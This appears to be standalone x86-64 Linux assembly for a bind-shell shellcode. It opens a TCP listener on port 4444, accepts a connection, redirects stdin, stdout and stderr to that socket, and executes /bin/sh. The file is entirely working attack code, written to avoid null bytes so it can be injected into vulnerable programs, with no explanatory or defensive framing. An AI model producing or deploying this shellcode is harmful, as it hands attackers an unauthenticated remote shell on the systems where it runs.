global _start

section .text
_start:
    xor     rdi, rdi
    xor     rsi, rsi
    xor     rax, rax
    
    ;; struct sockaddr
    push    rax                         ; 8 byte pad
    push    rax                         ; INADDR_ANY
    push    word 23569                  ; htons(4444) = htons(0x115c) = 0x5c11 = 23569
    push    word 2                      ; AF_INET
    
    ;; socket()
    mov     dil, 2                      ; AF_INET
    mov     sil, 1                      ; SOCK_STREAM
    xor     rdx, rdx                    ; IPPROTO_IP
    mov     al, 41                      ; socket syscall
    syscall
    
    ;; bind()
    mov     rdi, rax                    ; sock_fd
    mov     rsi, rsp                    ; sockaddr struct
    mov     dl, 24                      ; size
    xor     rax, rax
    mov     al, 49                      ; bind syscall
    syscall
    
    ;; listen()
    xor     rsi, rsi                    ; 0
    xor     rax, rax
    mov     al, 50                      ; listen syscall
    syscall
    
    ;; accept()
    xor     rdx, rdx                    ; 0
    xor     rax, rax
    mov     al, 43                      ; accept syscall
    syscall

    ;; dup2()
    mov     rdi, rax                    ; clnt_fd
    xor     r8, r8                      ; counter = 0
dup:
    mov     rsi, r8                     ; counter
    xor     rax, rax
    mov     al, 33                      ; dup syscall
    syscall
    inc     r8                          ; ++counter
    cmp     r8, 3
    jne     dup                         ; counter != 3
    
    ;; execve()
    xor     rsi, rsi                    ; NULL
    push    rsi                         ; \x00
    mov     rax, 0x68732f2f6e69622f     ; /bin//sh
    push    rax
    mov     rdi, rsp
    xor     rax, rax
    mov     al, 59                      ; execve syscall
    syscall

